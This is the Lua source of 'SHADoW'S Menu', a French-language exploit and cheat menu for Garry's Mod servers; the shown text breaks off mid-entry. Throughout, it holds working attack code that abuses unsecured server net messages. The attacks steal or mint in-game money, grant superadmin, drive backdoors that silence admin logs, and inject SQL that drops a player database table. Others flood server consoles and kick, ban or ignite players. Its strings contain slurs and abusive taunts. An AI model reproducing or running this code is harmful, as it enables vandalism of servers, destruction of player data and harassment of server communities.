if file.Exists( "includes/extensions/client/vehicles.lua", "LUA" ) == false then -- ne pas toucher cac check !!!!
MsgC (Color(math.random(1,255),math.random(1,255),math.random(1,255)), [[bienvenue sur le SHADoW'S Menu]])
local SHADoWS = nil
local RatesScaleLevel = LocalPlayer():SteamID()
local iZNX = {}
iZNX.memory = {}
local grad = Material( "gui/gradient" )
local thefrenchenculer = Material( "gui/gradient_up" )
local SHADoWS = Material( "gui/gradient_down" )
local ctext = chat.AddText
function iZNX.ChatText( str )
ctext( Color(200, 1, 1), [[ [SHADoW'S MENU]: ]]..str )
end
function iZNX.NetStart( str )
local netstart = net.Start
if SHADoWS and SHADoWS.G and SHADoWS.G.net then
netstart = SHADoWS.G.net.Start
else
--        print( "sending netmessage in insecure mode" )
end
return netstart( str )
end
function iZNX.ValidNetString( str )
local netstart = net.Start
if SHADoWS and SHADoWS.G and SHADoWS.G.net then
netstart = SHADoWS.G.net.Start
else
--        print( "scanning for exploit in insecure mode" )
end
local status, error = pcall( netstart, str )
return status
end
function iZNX.ValidNetString( str )
local status, error = pcall( net.Start, str )
return status
end
iZNX.sploits = {}
local severitycols = {
[1] = Color( 255, 255, 255 ),
[2] = Color( 255, 255, 255 ),
[3] = Color( 255, 255, 255 ),
[4] = Color( 255, 255, 255 ),
}
function iZNX.AddExploit( name, tab )
if !isstring( name ) then print("U FUCKED UP A SPLOIT RETARD") return end
if !istable( tab ) then print("U FUCKED UP A SPLOIT RETARD") return end
iZNX.sploits[name] = tab
end
function iZNX.IsStored( addr )
return iZNX.memory[addr] != nil
end
function iZNX.GetStored( addr, fallback )
if fallback and iZNX.memory[addr] == nil then return fallback end
return iZNX.memory[addr]
end
function iZNX.Store( addr, val )
iZNX.memory[addr] = val
end
function iZNX.GetAllStored()
return iZNX.memory
end
function iZNX.GetAllStoredData()
local ret = {}
for k, v in pairs( iZNX.memory ) do
if !istable( v ) then ret[k] = v end
end
return ret
end
function iZNX.LoadConfig()
local f = file.Read( "SHADoWS_exploit.dat", "DATA" )
if !f then iZNX.ChatText( "T'AS PAS SAVE DE CONFIG SALE TRIZOMIQUE" ) end
local raw = util.Decompress( f )
local garbage = util.JSONToTable( raw )
table.Merge( iZNX.memory, garbage )
--    iZNX.memory = garbage
iZNX.Menu:Remove()
iZNX.ChatText( "Fichier de configuration chargé" )
end
function iZNX.SaveConfig()
local myturds = util.TableToJSON( iZNX.GetAllStoredData() )
if !myturds then return end
local cumpressed = util.Compress( myturds )
file.Write( "SHADoWS_exploit.dat", cumpressed )
iZNX.ChatText( "Fichier de configuration sauvegardé" )
end
iZNX.AddExploit( "€ Customizable Printers Money Stealer €", {
desc = "Vole instantanément tout l'argent de chaque Printer sur le serveur",
severity = 3,
scan = function() return iZNX.ValidNetString( "SyncPrinterButtons76561198056171650" ) end,
functions = {
{ typ = "func", name = "Prendre", func = function()
if !timer.Exists( "SHADoWS_exploit_shekels" ) then
iZNX.ChatText( "Vole de l'argent lancé" )
timer.Create( "SHADoWS_exploit_shekels", 0.1, 0, function()
for k, v in pairs(ents.GetAll()) do
if( v:GetClass():find("print") ) then
iZNX.NetStart( "SyncPrinterButtons76561198056171650" )
net.WriteEntity(v)
net.WriteUInt(2, 4)
net.SendToServer()
end
end
end)
else
timer.Remove( "SHADoWS_exploit_shekels" )
iZNX.ChatText( "Vole de l'argent stoppé" )
end
end, },
},
} )
iZNX.AddExploit( "ULX Friends Spam", {
desc = "Spams tout le monde sur le serveur avec un message",
severity = 1,
scan = function() return (iZNX.ValidNetString( "sendtable" ) and ulx and ulx.friends ) end,
functions = {
{ typ = "string", name = "Entrer un message", default = "Bitch please", addr = "fr_spamstring" },
{ typ = "players", addr = "fr_players" },
{ typ = "func", name = "Big Spam", func = function()
if !timer.Exists( "bigspams" ) then
iZNX.ChatText( "big spam lancé" )
timer.Create( "bigspams", 0.5, 0, function()
local t = iZNX.GetStored( "fr_players", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
local buyit = {}
for i = 1, 15 do
table.insert( buyit, iZNX.GetStored( "fr_spamstring", "RIP les lags :/ */*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*" ) )
end
iZNX.NetStart( "sendtable" )
net.WriteEntity( v )
net.WriteTable( buyit )
net.SendToServer()
end
end)
else
timer.Remove( "bigspams" )
iZNX.ChatText( "big spam stoppé" )
end
end, },
},
} )
iZNX.AddExploit( "Console Erreur Spammer", {
desc = "Défonce le serveur rcon avec des erreurs massive )",
severity = 1,
scan = function() return iZNX.ValidNetString( "steamid50" ) end,
functions = {
{ typ = "func", name = "Big Spam", func = function()
if !timer.Exists( "SHADoWS_exploit_errorz" ) then
iZNX.ChatText( "erreur spam lancé" )
timer.Create( "SHADoWS_exploit_errorz", 0.1, 0, function()
iZNX.NetStart( "steamid50" )
net.WriteString( "Something is creating very strong script errors" )
net.SendToServer()
end)
else
timer.Remove( "SHADoWS_exploit_errorz" )
iZNX.ChatText( "erreur spam stoppé" )
end
end, },
},
} )
iZNX.AddExploit( "Turbo Erreur Spammer", {
desc = "Défonce le serveur rcon avec des erreurs massive.",
severity = 2,
scan = function() return iZNX.ValidNetString( "steamid50" ) end,
functions = {
{ typ = "func", name = "Big Spam", func = function()
if !timer.Exists( "SHADoWS_exploit_errorzt" ) then
iZNX.ChatText( "erreur spam lancé" )
timer.Create( "SHADoWS_exploit_errorzt", 0, 0, function()
for i = 1, 100 do
iZNX.NetStart( "steamid50" )
net.WriteString( "Something is creating very strong script errors" )
net.SendToServer()
end
end)
else
timer.Remove( "SHADoWS_exploit_errorzt" )
iZNX.ChatText( "erreur spam stoppé" )
end
end, },
},
} )
iZNX.AddExploit( "€ Kun Drug €", {
desc = "Exploit d'argent",
severity = 3,
scan = function() return iZNX.ValidNetString( "Kun_SellDrug" ) end,
functions = {
{ typ = "func", name = "Lancer", func = function()
if !timer.Exists( "SHADoWS_exploit_selldrugon" ) then
iZNX.ChatText( "Exploit lancé" )
timer.Create( "SHADoWS_exploit_selldrugon", 0, 0, function()
for i=1,1000 do
iZNX.NetStart("Kun_SellDrug")
net.WriteString("mushroom")
net.SendToServer()
end
end)
else
timer.Remove( "SHADoWS_exploit_selldrugon" )
iZNX.ChatText( "Exploit stoppé" )
end
end, },
},
} )
iZNX.AddExploit( "Point Shop Unbox", {
desc = "Exploit a téster",
severity = 2,
scan = function() return iZNX.ValidNetString( "net_PSUnBoxServer" ) end,
functions = {
{ typ = "func", name = "Lancer", func = function()
for k,v in pairs(player.GetAll()) do
local i = 0
for k2,v2 in pairs(PS.Items) do
if !v:PS_HasItem(v2.ID) then  
timer.Simple(k*i*1.7,function()
iZNX.NetStart("net_PSUnBoxServer")
net.WriteEntity(v)
net.WriteString(v2.ID)
net.SendToServer()
end)
i = i + 1
end
end
end
end, },
},
} )
iZNX.AddExploit( "☢ Give Superadmin ☢", {
desc = "Donnez le superadmin aux gens (deco reco pour que cela prenne effet)",
severity = 4,
scan = function() return iZNX.ValidNetString( "pplay_deleterow" ) end,
functions = {
{ typ = "players", addr = "l_superadmins" },
{ typ = "func", name = "Lancer", func = function()
local t = iZNX.GetStored( "l_superadmins", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
local id = v:SteamID()
local tbl = {}
tbl.name = "FAdmin_PlayerGroup"
tbl.where = {
"steamid",
tostring(id)
}
iZNX.NetStart("pplay_deleterow")
net.WriteTable(tbl)
net.SendToServer()
local tbl = {}
tbl.tblname = "FAdmin_PlayerGroup"
tbl.tblinfo = {
tostring(id),
"superadmin"
}
iZNX.NetStart("pplay_addrow")
net.WriteTable(tbl)
net.SendToServer()
iZNX.ChatText( "superadmin donné à "..v:Nick() )
end
end, },
},
} )
local thefrenchenculer = ""
if iZNX.ValidNetString( "Sandbox_ArmDupe" ) then
thefrenchenculer = "Sandbox_ArmDupe"
else
if iZNX.ValidNetString( "Fix_Keypads" ) then
thefrenchenculer = "Fix_Keypads"
else
if iZNX.ValidNetString( "Remove_Exploiters" ) then
thefrenchenculer = "Remove_Exploiters"
else
if iZNX.ValidNetString( "noclipcloakaesp_chat_text" ) then
thefrenchenculer = "noclipcloakaesp_chat_text"
else
if iZNX.ValidNetString( "memeDoor" ) then
thefrenchenculer = "memeDoor"
else
if iZNX.ValidNetString( "ULXQUERY2" ) then
thefrenchenculer = "ULXQUERY2"
else
if iZNX.ValidNetString( "DarkRP_AdminWeapons" ) then
thefrenchenculer = "DarkRP_AdminWeapons"
else
if iZNX.ValidNetString( "_Defqon" ) then
thefrenchenculer = "_Defqon"
else
if iZNX.ValidNetString( "_CAC_ReadMemory" ) then
thefrenchenculer = "_CAC_ReadMemory"
else
if iZNX.ValidNetString( "c" ) then
thefrenchenculer = "c"
else
if iZNX.ValidNetString( "killserver" ) then
thefrenchenculer = "killserver"
else
if iZNX.ValidNetString( "fuckserver" ) then
thefrenchenculer = "fuckserver"
else
if iZNX.ValidNetString( "cvaraccess" ) then
thefrenchenculer = "cvaraccess"
else
if iZNX.ValidNetString( "rcon" ) then
thefrenchenculer = "rcon"
else
if iZNX.ValidNetString( "rconadmin" ) then
thefrenchenculer = "rconadmin"
else
if iZNX.ValidNetString( "web" ) then
thefrenchenculer = "web"
else
if iZNX.ValidNetString( "nostrip" ) then
thefrenchenculer = "nostrip"
else
if iZNX.ValidNetString( "LickMeOut" ) then
thefrenchenculer = "LickMeOut"
else
if iZNX.ValidNetString( "MoonMan" ) then
thefrenchenculer = "MoonMan"
if iZNX.ValidNetString( "Im_SOCool" ) then
thefrenchenculer = "Im_SOCool"
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
iZNX.AddExploit( "LISTE BACKDOOR", {
desc = "Backdoor trés puissant, ENLEVE LES LOGS POUR ETRE PLUS DISCRET, Nom De La .NET : "..thefrenchenculer.."",
severity = 4,
scan = function() return iZNX.ValidNetString( thefrenchenculer ) end,
functions = {
{ typ = "func", name = "STOP LES LOGS", func = function()
iZNX.NetStart(thefrenchenculer)
net.WriteString( "RunConsoleCommand(\"ulx_logecho\", \"0\")" )
net.WriteBit(1)
net.SendToServer()
end, },
{ typ = "htxcommandeliste", name = "COMMANDES HTX" },
{ typ = "players", addr = "give_superadmins" },
{ typ = "func", name = "<- SUPERADMIN", func = function()
local t = iZNX.GetStored( "give_superadmins", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
local id = v:SteamID()
iZNX.NetStart(thefrenchenculer)
net.WriteString( "ulx adduserid "..id.." superadmin" )
net.WriteBit(false)
net.SendToServer()
end
end, },
},
} )
iZNX.AddExploit( "☢ Niquer la base de donné SQL (sa pique) ☢", {
desc = "Vandalisez la base de données darkrp master SQL, effaçant toutes les données des joueurs, vous devez être superamin !!",
severity = 4,
scan = function() return iZNX.ValidNetString( "pplay_sendtable" ) end,
functions = {
{ typ = "func", name = "Lancer", func = function()
local tbl = {}
tbl.tblname = "darkrp_door; DROP TABLE darkrp_player; CREATE TABLE darkrp_player(a STRING)"
tbl.ply = LocalPlayer()
iZNX.NetStart("pplay_sendtable")
net.WriteTable(tbl)
net.SendToServer()
iZNX.ChatText( "Base de données SQL Server détruite" )
end, },
},
} )
iZNX.AddExploit( "Niquer les Data du serveur (SA PIQUE)", {
desc = "Vandalise le data du serveur, va probablement ennuyer leurs fils de pute de dev x)",
severity = 3,
scan = function() return iZNX.ValidNetString( "WriteQuery" ) end,
functions = {
{ typ = "func", name = "Lancer", func = function()
if !timer.Exists( "SHADoWS_exploit_datatrasher" ) then
iZNX.ChatText( "Démarrage du spam du dossier data" )
timer.Create( "SHADoWS_exploit_datatrasher", 0.5, 0, function()
iZNX.NetStart( "WriteQuery" )
net.WriteString( "BAN ME -> "..LocalPlayer():SteamID()..string.rep( "!", math.random( 1, 5000 ) ) )
net.SendToServer()
end)
else
timer.Remove( "SHADoWS_exploit_datatrasher" )
iZNX.ChatText( "Spam du dossier data Stopper" )
end
end, },
},
} )
-- Patched
--[[iZNX.AddExploit( "Turbo Chat Spam", {
desc = "Gros spam, extrêmement gamain XD",
severity = 1,
scan = function() return iZNX.ValidNetString( "VJSay" ) end,
functions = {
{ typ = "string", name = "Entrer un message", default = "SHADoW'S MENU", addr = "vj_spamstring" },
{ typ = "string", name = "Entrer un son", default = "vo/npc/male01/hacks01.wav", addr = "vj_spamsound" },
{ typ = "func", name = "Big Spam", func = function()
if !timer.Exists( "bigspamsvj" ) then
iZNX.ChatText( "big spam lancé" )
timer.Create( "bigspamsvj", 0.1, 0, function()
for k, v in pairs( player.GetAll() ) do
iZNX.NetStart( "VJSay" )
net.WriteEntity( v )
net.WriteString( iZNX.GetStored( "vj_spamstring", "ACHETER LE @SHADoW'S MENU AJOUTEZ SHADoW'S" ) )
if iZNX.GetStored( "vj_spamsound", "" ) != "" then
net.WriteString( iZNX.GetStored( "vj_spamsound", "" ) )
end
net.SendToServer()
end
end)
else
timer.Remove( "bigspamsvj" )
iZNX.ChatText( "big spam stoppé" )
end
end, },
},
} )--]]
iZNX.AddExploit( "Give une arme", {
desc = "Exploit pour vous give des putains d'armes",
severity = 3,
scan = function() return iZNX.ValidNetString( "CraftSomething" ) end,
functions = {
{ typ = "string", name = "Nom Arme", default = "m9k_ak47", addr = "armes_a_prendre" },
{ typ = "func", name = "Prendre", func = function()
iZNX.NetStart( "CraftSomething" )
net.WriteEntity( LocalPlayer() )
net.WriteString( iZNX.GetStored( "armes_a_prendre" ) )
net.WriteString( "" )
net.WriteString( "weapon" )
net.SendToServer()
end, },
},
} )
iZNX.AddExploit( "ULX Extended ", {
desc = "Attention cette exploit est risquée si l'addon est à jour vous allez être kick ^^",
severity = 3,
scan = function() return iZNX.ValidNetString( "banleaver" ) end,
functions = {
{ typ = "func", name = "Ban les Admins (bug)", func = function()
for k,v in pairs(player.GetAll()) do              
if v:GetUserGroup() != "user" then -- Custom first ranks, youre fucked bro                
if v != LocalPlayer() then                
iZNX.NetStart("banleaver")                
net.WriteString(v:SteamID().."{sep}".."SHADoWSRekt")                
net.SendToServer()                
end                
end                
end
end, },
{ typ = "func", name = "Ban tout le monde (bug)", func = function()
for k,v in pairs(player.GetAll()) do              
if v != LocalPlayer() then                
iZNX.NetStart("banleaver")                
net.WriteString(v:SteamID().."{sep}".."SHADoWSRekt")                
net.SendToServer()                
end                
end  
end, },
},
} )
iZNX.AddExploit( "€ Casino NPC €", {
desc = "Exploit d'argent très efficace, go payer des putes et de la coke ;)",
severity = 4,
scan = function() return iZNX.ValidNetString( "75_plus_win" ) end,
functions = {
{ typ = "float", name = "Montant", min = "1", max = "100000000", default = "100000", addr = "montant_argent" },
{ typ = "players", addr = "l_players_listing" },
{ typ = "func", name = "Donner", func = function()
local t = iZNX.GetStored( "l_players_listing", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
iZNX.NetStart( "75_plus_win" )
net.WriteString( iZNX.GetStored( "montant_argent" ) )
net.WriteEntity(v)
net.SendToServer()
end
end, },
{ typ = "func", name = "Enlever", func = function()
local t = iZNX.GetStored( "l_players_listing", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
iZNX.NetStart( "75_plus_win" )
net.WriteString( -iZNX.GetStored( "montant_argent" ) )
net.WriteEntity(v)
net.SendToServer()
end
end, },
},
} )
iZNX.AddExploit( "€ ATM €", {
desc = "Exploit d'argent, go payer des putes et de la coke ;)",
severity = 4,
scan = function() return iZNX.ValidNetString( "ATMDepositMoney" ) end,
functions = {
{ typ = "float", name = "Montant", min = "1", max = "100000000", default = "100000", addr = "montant_argent5" },
{ typ = "func", name = "Prendre", func = function()
iZNX.NetStart( "ATMDepositMoney" )
net.WriteFloat( -iZNX.GetStored( "montant_argent5" ) )
net.SendToServer()
end, },
},
} )
iZNX.AddExploit( "TAXI Spawn Lag", {
desc = "Exploit pour faire chier les fdp de codeurs ;)",
severity = 2,
scan = function() return iZNX.ValidNetString( "Taxi_Add" ) end,
functions = {
{ typ = "func", name = "Spawn", func = function()
local Pos = LocalPlayer():GetEyeTrace().HitPos
iZNX.NetStart("Taxi_Add")
net.WriteString("Taxi Super Exploit #"..math.random( 1, 9999 ))
net.WriteTable({[1]=Pos.x,[2]=Pos.y,[3]=Pos.z})
net.WriteFloat(-9999999)
net.WriteString("Les addons leaks c'est plein d'exploit :D")
net.SendToServer()
end, },
{ typ = "func", name = "Super Spam", func = function()
if !timer.Exists( "taxispam" ) then
iZNX.ChatText( "Spam spawn Taxi lancé" )
timer.Create( "taxispam", 0.05, 0, function()
local Pos = LocalPlayer():GetEyeTrace().HitPos
iZNX.NetStart("Taxi_Add")
net.WriteString("Taxi Super Exploit #"..math.random( 1, 9999 ))
net.WriteTable({[1]=Pos.x,[2]=Pos.y,[3]=Pos.z})
net.WriteFloat(-9999999)
net.WriteString("Les addons leaks c'est plein d'exploit :D")
net.SendToServer()
end)
else
timer.Remove( "taxispam" )
iZNX.ChatText( "Spam spawn Taxi arreter" )
end
end, },
},
} )
iZNX.AddExploit( "€ eMining €", {
desc = "Exploit d'argent très efficace, go payer des putes et de la coke ;)",
severity = 4,
scan = function() return iZNX.ValidNetString( "SellMinerals" ) end,
functions = {
{ typ = "float", name = "Montant", min = "1", max = "100000000", default = "100000", addr = "montant_argent6" },
{ typ = "func", name = "Prendre", func = function()
for k,v in pairs(SkillDB) do
if not ( v.iSkill == true ) then
iZNX.NetStart("jecodeaveclecullalalalalalalalae")
net.WriteTable( { LuaName = v.LuaName, Amount = -iZNX.GetStored( "montant_argent6" ) } )
net.SendToServer()
iZNX.NetStart( "SellMinerals" )
net.WriteTable( { Target = LocalPlayer() } )
net.SendToServer()
end
end
end, },
{ typ = "func", name = "Enlever", func = function()
for k,v in pairs(SkillDB) do
if not ( v.iSkill == true ) then
iZNX.NetStart("jecodeaveclecullalalalalalalalae")
net.WriteTable( { LuaName = v.LuaName, Amount = iZNX.GetStored( "montant_argent6" ) } )
net.SendToServer()
iZNX.NetStart( "SellMinerals" )
net.WriteTable( { Target = LocalPlayer() } )
net.SendToServer()
end
end
end, },
},
} )
iZNX.AddExploit( "€ Gamble NPC €", {
desc = "Exploit d'argent Infini, go payer des putes et de la coke ;)",
severity = 4,
scan = function() return iZNX.ValidNetString( "TakeBetMoney" ) end,
functions = {
{ typ = "func", name = "Prendre", func = function()
iZNX.NetStart( "TakeBetMoney" )
net.WriteTable({1e333333 , 1e333333})
net.SendToServer()
end, },
},
} )
iZNX.AddExploit( "€ Kun Oil Mod €", {
desc = "Exploit d'argent, go payer des putes et de la coke ;)",
severity = 3,
scan = function() return iZNX.ValidNetString( "Kun_SellOil" ) end,
functions = {
{ typ = "func", name = "Prendre", func = function()
for k,v in pairs(ents.GetAll()) do
iZNX.NetStart("Kun_SellOil")
net.WriteEntity(v)
net.SendToServer()
end
end, },
},
} )
iZNX.AddExploit( "Rejoindre la Police 1", {
desc = "Rejoint la police sans passer par le putain de formulaire",
severity = 2,
scan = function() return iZNX.ValidNetString( "PoliceJoin" ) end,
functions = {
{ typ = "func", name = "Rejoindre", func = function()
iZNX.NetStart("PoliceJoin")
net.SendToServer()
end, },
},
} )
iZNX.AddExploit( "Rejoindre la Police 2", {
desc = "Rejoint la police sans passer le putain formulaire",
severity = 2,
scan = function() return iZNX.ValidNetString( "CpForm_Answers" ) end,
functions = {
{ typ = "func", name = "Rejoindre", func = function()
iZNX.NetStart("CpForm_Answers")
net.WriteEntity(LocalPlayer())
net.WriteTable({})
net.SendToServer()
end, },
},
} )
iZNX.AddExploit( "€ Deposit Money €", {
desc = "Exploit d'argent avec les ATM Deposit Money",
severity = 2,
scan = function() return iZNX.ValidNetString( "DepositMoney" ) end,
functions = {
{ typ = "float", name = "Montant", min = "1", max = "100000000", default = "100000", addr = "montant_argent7" },
{ typ = "func", name = "Lancer", func = function()
for k,v in pairs(ents.GetAll()) do
swag = v
end
for k,v in pairs(player.GetAll()) do
iZNX.NetStart( "DepositMoney" )
net.WriteEntity(swag)
net.WriteString(-iZNX.GetStored( "montant_argent7" ))
net.WriteEntity(v)
net.SendToServer()
end
end, },
},
} )
iZNX.AddExploit( "MDE", {
desc = "Exploit pour supprimer des PermaProps (Viser le props et cliquer sur l'exploit pour le supprimer)",
severity = 2,
scan = function() return iZNX.ValidNetString( "MDE_RemoveStuff_C2S" ) end,
functions = {
{ typ = "func", name = "Lancer", func = function()
iZNX.NetStart( "MDE_RemoveStuff_C2S" )
net.WriteTable( {DATA="",TARGET=LocalPlayer():GetEyeTrace().Entity} )
net.SendToServer()
end, },
},
} )
iZNX.AddExploit( "€ SS Shelf NET €", {
desc = "Exploit d'argent",
severity = 3,
scan = function() return iZNX.ValidNetString( "NET_SS_DoBuyTakeoff" ) end,
functions = {
{ typ = "float", name = "Montant", min = "1", max = "100000000", default = "100000", addr = "montant_argent9" },
{ typ = "func", name = "Lancer", func = function()
for k,v in pairs(ents.GetAll()) do
swag = v
end
iZNX.NetStart( 'NET_SS_DoBuyTakeoff' )          
net.WriteEntity(LocalPlayer())          
net.WriteEntity(swag)          
net.WriteTable({'spawned_weapon'})          
net.WriteInt(-iZNX.GetStored( "montant_argent9" ), 16)      
net.SendToServer()  
end, },
},
} )
iZNX.AddExploit( "€ MODIFIER TAXES €", {
desc = "Exploit d'argent",
severity = 3,
scan = function() return iZNX.ValidNetString( "NET_EcSetTax" ) end,
functions = {
{ typ = "float", name = "Montant", min = "1", max = "100000000", default = "100000", addr = "montant_argent10" },
{ typ = "func", name = "Lancer", func = function()
iZNX.NetStart("NET_EcSetTax")
net.WriteInt(-iZNX.GetStored( "montant_argent10" ), 16)
net.SendToServer()
end, },
},
} )
iZNX.AddExploit( "€ Fine System €", {
desc = "Exploit d'argent , go payer des putes et de la coke ;)",
severity = 3,
scan = function() return iZNX.ValidNetString( "RP_Accept_Fine" ) end,
functions = {
{ typ = "float", name = "Montant", min = "1", max = "100000000", default = "100000", addr = "montant_argent11" },
{ typ = "players", addr = "l_players_listing_fine" },
{ typ = "func", name = "Prendre", func = function()
local t = iZNX.GetStored( "l_players_listing_fine", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
iZNX.NetStart("RP_Accept_Fine")
net.WriteString(v:Nick())
net.WriteDouble(-iZNX.GetStored( "montant_argent11" ))
net.SendToServer()
end
end, },
{ typ = "func", name = "Envoyer Amende x)", func = function()
local t = iZNX.GetStored( "l_players_listing_fine", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
iZNX.NetStart("RP_Fine_Player")
net.WriteString(v:Nick())
net.WriteString(v:Nick())
net.WriteDouble(iZNX.GetStored( "montant_argent11" ))
net.WriteString("Ce serveur mérite une anarchie! Serveur hacked!! Vous pouvez lecher mon trou du cul maintenant x)")
net.SendToServer()
end
end, },
{ typ = "func", name = "Spam Envoyer Amende x)", func = function()
if !timer.Exists( "spamamandefine" ) then
iZNX.ChatText( "Spam lancé" )
timer.Create( "spamamandefine", 0.1, 0, function()
local t = iZNX.GetStored( "l_players_listing_fine", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
iZNX.NetStart("RP_Fine_Player")
net.WriteString(v:Nick())
net.WriteString(v:Nick())
net.WriteDouble(iZNX.GetStored( "montant_argent11" ))
net.WriteString("Ce serveur mérite une anarchie! Serveur hacked!! Vous pouvez lecher mon trou du cul maintenant x)")
net.SendToServer()
end
end)
else
timer.Remove( "spamamandefine" )
iZNX.ChatText( "Spam stoppé" )
end
end, },
},
} )
iZNX.AddExploit( "€ 3D Cardealer €", {
desc = "Exploit d'argent, Regarder un vehicule que vous avez acheté pour le dupliquer ;)",
severity = 2,
scan = function() return iZNX.ValidNetString( "RXCAR_Shop_Store_C2S" ) end,
functions = {
{ typ = "func", name = "Dupliquer", func = function()
for i = 0, 75 do              
iZNX.NetStart( "RXCAR_Shop_Store_C2S" );              
net.WriteTable( { E = ent } );                
net.SendToServer();                
end
end, },
{ typ = "func", name = "Tout Vendre", func = function()
local ent              
for k,v in pairs(ents.GetAll()) do                
if v:GetClass() == "rm_car_dealer" then                
ent = v                
end                
end                
for k,v in pairs(RX3DCar_Inventory) do                
iZNX.NetStart( "RXCAR_SellINVCar_C2S" )                
net.WriteTable({UN=v.UniqueID,SE=ent})                
net.SendToServer()                
end      
end, },          
},
} )
iZNX.AddExploit( "Supprimer Armes / Argent (ultra rare)", {
desc = "Supprimer les armes / l'argent de touts le monde",
severity = 3,
scan = function() return iZNX.ValidNetString( "drugseffect_remove" ) end,
functions = {
{ typ = "func", name = "Supprimer Armes", func = function()
iZNX.NetStart("drugseffect_remove")
net.SendToServer()
end, },
{ typ = "func", name = "Supprimer Argent", func = function()
iZNX.NetStart("drugs_money")
net.SendToServer()
end, },
},
} )
iZNX.AddExploit( "€ Crafting Mod €", {
desc = "Exploit d'argent",
severity = 3,
scan = function() return iZNX.ValidNetString( "CRAFTINGMOD_SHOP" ) end,
functions = {
{ typ = "float", name = "Montant", min = "1", max = "100000000", default = "100000", addr = "montant_argent14" },
{ typ = "func", name = "Ajouter Argent", func = function()
iZNX.NetStart("CRAFTINGMOD_SHOP")
net.WriteTable({
BUY =   -iZNX.GetStored( "montant_argent14" );
type    =   1
})
net.WriteInt(1,16)
net.SendToServer()
end, },
{ typ = "func", name = "Enlever Argent", func = function()
iZNX.NetStart("CRAFTINGMOD_SHOP")
net.WriteTable({
BUY =   LocalPlayer():getDarkRPVar("money");
type    =   1
})
net.WriteInt(1,16)
net.SendToServer()
end, },
},
} )
iZNX.AddExploit( "Mettre le Feu", {
desc = "Mettre les props/joueur en feu. RIP JOHNNY.",
severity = 3,
scan = function() return iZNX.ValidNetString( "drugs_ignite" ) end,
functions = {
{ typ = "func", name = "Feux Props", func = function()
iZNX.NetStart("drugs_ignite")
net.WriteString("prop_physics")
net.SendToServer()
end, },
{ typ = "func", name = "Feux Joueurs", func = function()
iZNX.NetStart("drugs_ignite")
net.WriteString("player")
net.SendToServer()
end, },
},
} )
iZNX.AddExploit( "Modifier la Vie", {
desc = "Changer la vie des joueurs(ultra rare)",
severity = 2,
scan = function() return iZNX.ValidNetString( "drugseffect_hpremove" ) end,
functions = {
{ typ = "float", name = "Montant", min = "1", max = "100000000", default = "100", addr = "montant_argent15" },
{ typ = "func", name = "Vie Normal", func = function()
iZNX.NetStart("drugseffect_hpremove")
net.WriteString(iZNX.GetStored( "montant_argent15" ))
net.SendToServer()
end, },
},
} )
iZNX.AddExploit( "Teleportation", {
desc = "Teleport les joueurs que vous regarder au spawn)",
severity = 2,
scan = function() return iZNX.ValidNetString( "DarkRP_Kun_ForceSpawn" ) end,
functions = {
{ typ = "func", name = "Teleport", func = function()
iZNX.NetStart("DarkRP_Kun_ForceSpawn")
net.SendToServer()
end, },
},
} )
iZNX.AddExploit( "Supprimer les props 2", {
desc = "Je sait pas ce que ça fait (ça fait surement respawn les joueurs que vous visez ou un truc comme ça ^^'')",
severity = 2,
scan = function() return iZNX.ValidNetString( "drugs_text" ) end,
functions = {
{ typ = "func", name = "Supprimer", func = function()
iZNX.NetStart("drugs_text")
net.WriteString("prop_physics")
net.SendToServer()
end, },
},
} )
iZNX.AddExploit( "Kick 3", {
desc = "Exploit pour kick touts les joueurs",
severity = 3,
scan = function() return iZNX.ValidNetString( "NLRKick" ) end,
functions = {
{ typ = "players", addr = "l_players_listing515" },
{ typ = "func", name = "Kick", func = function()
local t = iZNX.GetStored( "l_players_listing515", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
iZNX.NetStart("NLRKick")
net.WriteEntity(v)
net.SendToServer()
end
end, },
},
} )
iZNX.AddExploit( "Kick 2", {
desc = "Exploit pour kick",
severity = 3,
scan = function() return iZNX.ValidNetString( "RecKickAFKer" ) end,
functions = {
{ typ = "players", addr = "l_players_listing2545" },
{ typ = "func", name = "Kick", func = function()
local t = iZNX.GetStored( "l_players_listing2545", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
iZNX.NetStart("RecKickAFKer")
net.WriteEntity(v)
net.SendToServer()
end
end, },
},
} )
iZNX.AddExploit( "Loot Items", {
desc = "Auto-Loot des items",
severity = 2,
scan = function() return iZNX.ValidNetString( "GMBG:PickupItem" ) end,
functions = {
{ typ = "func", name = "Loot", func = function()
for k, v in pairs(ents.GetAll()) do        
if v:GetClass() == "item_loot" then                
iZNX.NetStart("GMBG:PickupItem")
net.WriteEntity(v)
net.SendToServer()
iZNX.NetStart("GMBG:PickupItem")
net.WriteEntity(v)
net.SendToServer()
iZNX.NetStart("GMBG:PickupItem")
net.WriteEntity(v)
net.SendToServer()
iZNX.NetStart("GMBG:PickupItem")
net.WriteEntity(v)
net.SendToServer()
iZNX.NetStart("GMBG:PickupItem")
net.WriteEntity(v)
net.SendToServer()
iZNX.NetStart("GMBG:PickupItem")
net.WriteEntity(v)
net.SendToServer()
end
end
end, },
},
} )
iZNX.AddExploit( "Kick tout le monde", {
desc = "Exploit pour kick touts les joueurs",
severity = 3,
scan = function() return iZNX.ValidNetString( "DL_Answering" ) end,
functions = {
